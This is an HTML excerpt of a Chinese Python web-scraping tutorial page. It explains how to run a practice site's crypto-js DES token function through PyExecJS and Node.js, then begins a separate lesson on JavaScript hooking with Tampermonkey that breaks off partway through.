              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2022114.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - Python 模拟执行 JavaScript</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3 网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>前面我们了解了一些 JavaScript 逆向的调试技巧，通过一些方法，我们可以找到一些突破口，进而找到关键的方法定义。</p>
                  <p>比如说，通过一些调试，我们找到了一个加密参数 token 是由某一个叫做 encrypt 方法产生的，如果里面的逻辑相对简单的话，那其实我们可以用 Python 完全重写一遍。但是现实情况往往不是这样的，一般来说，一些加密相关的方法通常会引用一些相关标准库，比如说 JavaScript 就有一个广泛使用的库，叫做 crypto-js，GitHub 仓库链接是：<a href="https://github.com/brix/crypto-js，这个库实现了很多主流的加密算法，包括对称加密、非对称加密、字符编码等等，比如对于" target="_blank" rel="noopener">https://github.com/brix/crypto-js，这个库实现了很多主流的加密算法，包括对称加密、非对称加密、字符编码等等，比如对于</a> AES 加密，通常我们需要输入待加密文本和加密密钥，实现如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> ciphertext = CryptoJS.AES.encrypt(message, key).toString();</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>对于这样的情况，我们其实就没法很轻易地完全重写一遍了，因为 Python 中并不一定有和 JavaScript 完全一样的类库。</p>
                  <p>那有什么解决办法吗？有的，既然 JavaScript 已经实现好了，那我用 Python 直接模拟执行这些 JavaScript 得到结果不就好了吗？</p>
                  <p>所以，本节我们就来了解下使用 Python 模拟执行 JavaScript 的解决方案。</p>
                  <h2 id="1-案例引入"><a href="#1-案例引入" class="headerlink" title="1. 案例引入"></a>1. 案例引入</h2>
                  <p>这里我们先看一个和上文描述的情形非常相似的案例，链接是：<a href="https://spa7.scrape.center/，如图所示：" target="_blank" rel="noopener">https://spa7.scrape.center/，如图所示：</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/hft6o.png" alt="image-20210825014021855"></p>
                  <p>这是一个 NBA 球星网站，用卡片的形式展示了一些球星的基本信息，另外每一张卡片上其实都有一个加密字符串，这个加密字符串其实和球星的相关信息是有关联的，每个球星的 加密字符串也是不同的。</p>
                  <p>所以，这里我们要做的就是找出这个加密字符串的加密算法并用程序把加密字符串的生成过程模拟出来。</p>
                  <h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2>
                  <p>由于本节我们需要使用 Python 模拟执行 JavaScript，这里我们使用的库叫做 PyExecJS，我们使用 pip3 安装即可，命令如下：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> pyexecjs</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>PyExecJS 是用于执行 JavaScript 的，但执行 JavaScript 的功能需要依赖一个 JavaScript 运行环境，所以除了安装好这个库之外，我们还需要安装一个 JavaScript 运行环境，个人比较推荐的是 Node.js，所以我们还需要安装下 Node.js，可以到 <a href="https://nodejs.org/" target="_blank" rel="noopener">https://nodejs.org/</a> 下载安装。更加详细的安装和配置过程可以参考：<a href="https://setup.scrape.center/pyexecjs。" target="_blank" rel="noopener">https://setup.scrape.center/pyexecjs。</a></p>
                  <p>PyExecJS 库在运行时会检测本地 JavaScript 运行环境来实现 JavaScript 执行，做好如上准备工作之后， 接着我们运行代码检查一下运行环境：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line">print(execjs.get().name)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果类似如下：</p>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">Node</span>.<span class="title">js</span> (V8)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果你成功安装好 PyExecJS 库和 Node.js 的话，其结果就是 Node.js (V8)，当然如果你安装的是其他的 JavaScript 运行环境，结果也会有所不同。</p>
                  <h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h2>
                  <p>接下来我们就对这个网站稍作分析，打开 Sources 面板，我们可以非常轻易地找到加密字符串的生成逻辑，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/jqozz.png" alt="image-20210826034346308"></p>
                  <p>首先声明了一个球员相关的列表，如：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> players = [</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">'凯文-杜兰特'</span>,</span><br><span class="line">    image: <span class="string">'durant.png'</span>,</span><br><span class="line">    birthday: <span class="string">'1988-09-29'</span>,</span><br><span class="line">    height: <span class="string">'208cm'</span>,</span><br><span class="line">    weight: <span class="string">'108.9KG'</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">]</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后对于每一个球员，都把每个球员的信息调用了加密算法进行了加密，我们可以打个断点看下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/hhqxx.png" alt="image-20210825014950392"></p>
                  <p>这里我们可以看到，getToken 方法的输入就是单个球员的信息，就是上述列表的一个元素对象，然后 <code>this.key</code> 就是一个固定的字符串。整个加密逻辑就是提取了球员的名字、生日、身高、体重，然后先 Base64 编码然后再进行 DES 加密，最后返回结果。</p>
                  <p>加密算法是怎么实现的呢？其实就是依赖了 crypto-js 库，使用了 CryptoJS 对象来实现的。</p>
                  <p>那 CryptoJS 这个对象是哪里来的呢？总不能凭空产生吧？其实这个网站就是直接引用了这个库，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/3k2i9.png" alt="image-20210826035113504"></p>
                  <p>引用这个 JavaScript 文件之后，CryptoJS 就被注入到浏览器全局环境下了，因此我们就可以在别的方法里面直接使用 CryptoJS 对象里面的方法了。</p>
                  <h2 id="4-模拟调用"><a href="#4-模拟调用" class="headerlink" title="4. 模拟调用"></a>4. 模拟调用</h2>
                  <p>好，那既然这样，我们要怎么模拟呢？下面我们来实现下。</p>
                  <p>首先，我们要模拟的其实就是这个 getToken 方法，输入球员相关信息，得到最终的加密字符串，这里我们直接把 key 替换下，把 getToken 方法稍微改写如下：</p>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function">function <span class="title">getToken</span><span class="params">(player)</span> </span>&#123;</span><br><span class="line">  let key = CryptoJS.enc.Utf8.parse(<span class="string">"fipFfVsZsTda94hJNKJfLoaqyqMZFFimwLt"</span>);</span><br><span class="line">  <span class="keyword">const</span> &#123; name, birthday, height, weight &#125; = player;</span><br><span class="line">  let base64Name = CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(name));</span><br><span class="line">  let encrypted = CryptoJS.DES.encrypt(</span><br><span class="line">    `$&#123;base64Name&#125;$&#123;birthday&#125;$&#123;height&#125;$&#123;weight&#125;`,</span><br><span class="line">    key,</span><br><span class="line">    &#123;</span><br><span class="line">      mode: CryptoJS.mode.ECB,</span><br><span class="line">      padding: CryptoJS.pad.Pkcs7,</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> encrypted.toString();</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>因为这个方法的模拟执行是需要 CryptoJS 这个对象的，如果我们直接调用这个方法肯定会报 CryptoJS 未定义的错误。</p>
                  <p>那怎么办呢？我们只需要再模拟执行下刚才看到的 crypto-js.min.js 不就好了吗？</p>
                  <p>OK，所以，我们需要模拟执行的内容就是两部分：</p>
                  <ul>
                    <li>模拟运行 crypto-js.min.js 里面的 JavaScript，用于声明 CryptoJS 对象。</li>
                    <li>模拟运行 getToken 方法的定义，用于声明 getToken 方法。</li>
                  </ul>
                  <p>好，接下来我们就把 crypto-js.min.js 里面的代码和上面 getToken 方法的代码复制一下，都粘贴到一个 JavaScript 文件里面，比如就叫做 crypto.js。</p>
                  <p>接下来我们就用 PyExecJS 模拟执行一下吧，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">item = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'凯文-杜兰特'</span>,</span><br><span class="line">    <span class="string">'image'</span>: <span class="string">'durant.png'</span>,</span><br><span class="line">    <span class="string">'birthday'</span>: <span class="string">'1988-09-29'</span>,</span><br><span class="line">    <span class="string">'height'</span>: <span class="string">'208cm'</span>,</span><br><span class="line">    <span class="string">'weight'</span>: <span class="string">'108.9KG'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file = <span class="string">'crypto.js'</span></span><br><span class="line">node = execjs.get()</span><br><span class="line">ctx = node.compile(open(file).read())</span><br><span class="line"></span><br><span class="line">js = <span class="string">f"getToken(<span class="subst">&#123;json.dumps(item, ensure_ascii=<span class="literal">False</span>)&#125;</span>)"</span></span><br><span class="line">print(js)</span><br><span class="line">result = ctx.eval(js)</span><br><span class="line">print(result)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们单独定义了一位球员的信息，赋值为 item 变量。然后使用 execjs 的 get 方法获取了 JavaScript 执行环境，赋值为 node。</p>
                  <p>接着我们调用了 node 的 compile 方法，传入了刚才定义的 crypto.js 文件的文本内容，compile 方法会返回一个 JavaScript 的上下文对象，我们赋值为 ctx。执行到这里，其实就可以理解为，ctx 对象里面就执行过了 crypto-js.min.js，CryptoJS 就声明好了，然后也执行过了 getToken 的定义，所以 getToken 方法也定义好了，相当于完成了一些初始化的工作。</p>
                  <p>接着，我们只需要定义好我们想要执行的 JavaScript 代码就好了，我们定义了一个 js 变量，其实就是模拟调用了 getToken 方法并传入了球员信息，我们打印了下 js 变量的值，内容如下：</p>
                  <figure class="highlight stylus">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="title">getToken</span><span class="params">(&#123;<span class="string">"name"</span>: <span class="string">"凯文-杜兰特"</span>, <span class="string">"image"</span>: <span class="string">"durant.png"</span>, <span class="string">"birthday"</span>: <span class="string">"1988-09-29"</span>, <span class="string">"height"</span>: <span class="string">"208cm"</span>, <span class="string">"weight"</span>: <span class="string">"108.9KG"</span>&#125;)</span></span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其实这就是一个标准的 JavaScript 方法调用的写法而已。</p>
                  <p>接着我们调用 ctx 对象的 eval 方法并传入 js 变量，其实就是模拟执行了这句 JavaScript 代码，照理来说最终返回的就是加密字符串了。</p>
                  <p>然而，运行之后，我们可能看到这个报错：</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">execjs</span><span class="selector-class">._exceptions</span><span class="selector-class">.ProgramError</span>: <span class="selector-tag">ReferenceError</span>: <span class="selector-tag">CryptoJS</span> <span class="selector-tag">is</span> <span class="selector-tag">not</span> <span class="selector-tag">defined</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>很奇怪，CryptoJS 未定义？我们明明执行过 crypto-js.min.js 里面的内容了呀？</p>
                  <p>问题其实出在 crypto-js.min.js 里面，可以看到其里面声明了一个 JavaScript 的自执行方法，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/2rxkp.png" alt="image-20210825020403826"></p>
                  <p>自执行方法什么意思呢？就是声明了一个方法，然后紧接着调用执行，我们可以看下这个例子：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">!(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"result"</span>, a, b);</span><br><span class="line">&#125;)(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们先声明了一个 function，然后接收 a 和 b 两个参数，然后把内容输出出来，然后我们把这个 function 用小括号括起来，这其实就是一个方法，可以被直接调用的，怎么调用呢？后面再跟上对应的参数就好了，比如传入 1 和 2，执行结果如下：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">result <span class="number">1</span> <span class="number">2</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，这个自执行的方法就被执行了。</p>
                  <p>同理地，crypto-js.min.js 也符合这个格式，它接收 t 和 e 两个参数，t 就是 this，其实就是浏览器中的 window 对象，e 就是一个 function（用于定义 CryptoJS 的核心内容）。</p>
                  <p>我们再来观察下 crypto-js.min.js 开头的定义：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">"object"</span> == <span class="keyword">typeof</span> exports</span><br><span class="line">  ? (<span class="built_in">module</span>.exports = exports = e())</span><br><span class="line">  : <span class="string">"function"</span> == <span class="keyword">typeof</span> define &amp;&amp; define.amd</span><br><span class="line">  ? define([], e)</span><br><span class="line">  : (t.CryptoJS = e());</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在 Node.js 中，其实 exports 就是用来将一些对象的定义进行导出的，这里 <code>&quot;object&quot; == typeof exports</code> 其实结果就是 true，所以就执行了 <code>module.exports = exports = e()</code> 这段代码，这样就相当于把 <code>e()</code> 作为整体导出了，而这个 <code>e()</code> 其实就对应这后面的整个 function，function 里面定义了加密相关的各个实现，其实就指代整个加密算法库。</p>
                  <p>但是在浏览器中，其结果就不一样了，浏览器环境中并没有 exports 和 define 这两个对象。所以，上述代码在浏览器中最后执行的就是 <code>t.CryptoJS = e()</code> 这段代码，其实这里就是把 CryptoJS 对象挂载到 this 对象上面，而 this 就是浏览器中的全局 window 对象，后面就可以直接用了。如果我们把代码放在浏览器中运行，那是没有任何问题的。</p>
                  <p>然而，我们使用的 PyExecJS 是依赖于一个 Node.js 执行环境的，所以上述代码其实执行的是 <code>module.exports = exports = e()</code>，这里面并没有声明 CryptoJS 对象，也没有把 CryptoJS 挂载到全局对象里面，所以后面我们再调用 CryptoJS 就自然而然出现了未定义的错误了。</p>
                  <p>那怎么办呢？其实很简单，那我们直接声明一个 CryptoJS 变量，然后手动声明一下它的初始化不就好了吗？所以我们可以把代码稍作修改，改成如下内容：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> CryptoJS;</span><br><span class="line">!(<span class="function"><span class="keyword">function</span> (<span class="params">t, e</span>) </span>&#123;</span><br><span class="line">  CryptoJS = e();</span><br><span class="line">  <span class="string">"object"</span> == <span class="keyword">typeof</span> exports</span><br><span class="line">    ? (<span class="built_in">module</span>.exports = exports = e())</span><br><span class="line">    : <span class="string">"function"</span> == <span class="keyword">typeof</span> define &amp;&amp; define.amd</span><br><span class="line">    ? define([], e)</span><br><span class="line">    : (t.CryptoJS = e());</span><br><span class="line">&#125;)(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们就首先声明了一个 CryptoJS 变量，然后直接给 CryptoJS 变量赋值给 <code>e()</code>，这样就完成了 CryptoJS 的初始化。</p>
                  <p>这样我们再重新运行刚才的 Python 脚本，就可以得到执行结果了：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">gQSfeqldQIJKAZHH9TzRX/<span class="attribute">exvIwb0j73b2cjXvy6PeZ3rGW6sQsL2w</span>==</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样我们就成功得到加密字符串了，和示例网站上显示的是一模一样的，这样我们就成功模拟 JavaScript 的调用完成了某个加密算法的运行过程。</p>
                  <h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2>
                  <p>本节介绍了利用 PyExecJS 来模拟执行 JavaScript 的方法，结合一个案例来完成了整个的实现和问题排查的过程。本节内容还是比较重要的，以后我们如果需要模拟执行 JavaScript 就可以派得上用场。</p>
                  <p>本节代码；<a href="https://github.com/Python3WebSpider/ScrapeSpa7。" target="_blank" rel="noopener">https://github.com/Python3WebSpider/ScrapeSpa7。</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-12 15:11:34" itemprop="dateCreated datePublished" datetime="2022-03-12T15:11:34+08:00">2022-03-12</time>
                </span>
                <span id="/2022114.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - Python 模拟执行 JavaScript" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>5.8k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>5 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2022113.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2022113.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - JavaScript Hook 的用法</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3 网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>在 JavaScript 逆向的时候，我们经常需要追踪某些方法的堆栈调用情况。但在很多情况下，一些 JavaScript 的变量或者方法名经过混淆之后是非常难以捕捉的。上一节我们介绍了一些断点调试、调用栈查看等技巧，但仅仅凭借这些技巧还不足以应对多数 JavaScript 逆向。</p>
                  <p>本节我们再来介绍一个比较常用的 JavaScript 逆向技巧 —— Hook 技术。</p>
                  <h2 id="1-Hook-技术"><a href="#1-Hook-技术" class="headerlink" title="1. Hook 技术"></a>1. Hook 技术</h2>
                  <p>Hook 技术中文又叫作钩子技术，指在程序运行的过程中，对其中的某个方法进行重写，在原先的方法前后加入我们自定义的代码。相当于在系统没有调用该函数之前，钩子程序就先捕获该消息，得到控制权，这时钩子函数既可以加工处理（改变）该函数的执行行为，也可以强制结束消息的传递。</p>
                  <p>要对 JavaScript 代码进行 Hook 操作，就需要额外在页面中执行一些自定义的有关 Hook 逻辑的代码。那么问题来了？怎样才能在浏览器中方便地执行我们所期望执行的 JavaScript 代码呢？在这里推荐一个插件，叫作 Tampermonkey。这个插件的功能非常强大，利用它我们几乎可以在网页中执行任何 JavaScript 代码，实现我们想要的功能。</p>
                  <p>下面我们就来介绍一下这个插件的使用方法，并结合一个实际案例，介绍一下这个插件在 JavaScript Hook 中的用途。</p>
                  <h2 id="2-Tampermonkey"><a href="#2-Tampermonkey" class="headerlink" title="2. Tampermonkey"></a>2. Tampermonkey</h2>
                  <p>Tampermonkey，中文也叫作“油猴”，它是一款浏览器插件，支持 Chrome。利用它我们可以在浏览器加载页面时自动执行某些 JavaScript 脚本。由于执行的是 JavaScript，所以我们几乎可以在网页中完成任何我们想实现的效果，如自动爬虫、自动修改页面、自动响应事件等。</p>
                  <p>其实，Tampermonkey 的用途远远不止这些，只要我们想要的功能能用 JavaScript 实现，Tampermonkey 就可以帮我们做到。比如我们可以将 Tampermonkey 应用到 JavaScript 逆向分析中，去帮助我们更方便地分析一些 JavaScript 加密和混淆代码。</p>
                  <h2 id="3-安装"><a href="#3-安装" class="headerlink" title="3. 安装"></a>3. 安装</h2>
                  <p>首先我们需要安装 Tampermonkey，这里我们使用的浏览器是 Chrome。直接在 Chrome 应用商店或者在 Tampermonkey 的官网 <a href="https://www.tampermonkey.net/" target="_blank" rel="noopener">https://www.tampermonkey.net/</a> 下载安装即可。</p>
                  <p>安装完成之后，在 Chrome 浏览器的右上角会出现 Tampermonkey 的图标，这就代表安装成功了，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/vyqt9.png" alt=""></p>
                  <h2 id="4-获取脚本"><a href="#4-获取脚本" class="headerlink" title="4. 获取脚本"></a>4. 获取脚本</h2>
                  <p>Tampermonkey 运行的是 JavaScript 脚本，每个网站都能有对应的脚本运行，不同的脚本能完成不同的功能。这些脚本我们可以自定义，也可以用已经写好的很多脚本，毕竟有些轮子有了，我们就不需要再去造了。</p>
                  <p>我们可以在 <a href="https://greasyfork.org/zh-CN/scripts" target="_blank" rel="noopener">https://greasyfork.org/zh-CN/scripts</a> 找到一些非常实用的脚本，如全网视频去广告、百度云全网搜索等，大家可以体验一下。</p>
                  <h2 id="5-脚本编写"><a href="#5-脚本编写" class="headerlink" title="5. 脚本编写"></a>5. 脚本编写</h2>
                  <p>除了使用别人已经写好的脚本，我们也可以自己编写脚本来实现想要的功能。编写脚本难不难呢？其实就是写 JavaScript 代码，只要懂一些 JavaScript 的语法就好了。另外我们需要遵循脚本的一些写作规范，其中就包括一些参数的设置。</p>
                  <p>下面我们就简单实现一个小的脚本。首先我们可以点击 Tampermonkey 插件图标，再点击“管理面板”按钮，打开脚本管理页面，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/4u47o.png" alt=""></p>
                  <p>脚本管理页面如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/w2zuf.png" alt=""></p>
                  <p>在这里显示了我们已经有的一些 Tampermonkey 脚本，包括我们自行创建的，也包括从第三方网站下载安装的。另外这里提供了编辑、调试、删除等管理功能，在这里可以方便地对脚本进行管理。</p>
                  <p>接下来我们来创建一个新的脚本，点击左侧的“+”号，会显示如图所示的页面。</p>
                  <p><img src="https://cdn.cuiqingcai.com/pqq74.png" alt=""></p>
                  <p>初始化的代码如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         New Userscript</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match        https://www.tampermonkey.net/documentation.php?ext=dhdg</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  "use strict"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Your code here...</span></span><br><span class="line">&#125;)();</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在上面这段代码里，最前面是一些注释，它们非常有用，这部分内容叫作 <code>UserScript Header</code> ，我们可以在里面配置一些脚本的信息，如名称、版本、描述、生效站点等等。</p>
                  <p>下面简单介绍一下 <code>UserScript Header</code> 的一些参数定义。</p>
                  <ul>
                    <li>
                      <p><code>@name</code>：脚本的名称，就是在控制面板显示的脚本名称。</p>
                    </li>
                    <li>
                      <p><code>@namespace</code>：脚本的命名空间。</p>
                    </li>
                    <li>
                      <p><code>@version</code>：脚本的版本，主要是做版本更新时用。</p>
                    </li>
                    <li>
                      <p><code>@author</code>：作者。</p>
                    </li>
                    <li>
                      <p><code>@description</code>：脚本描述。</p>
                    </li>
                    <li>
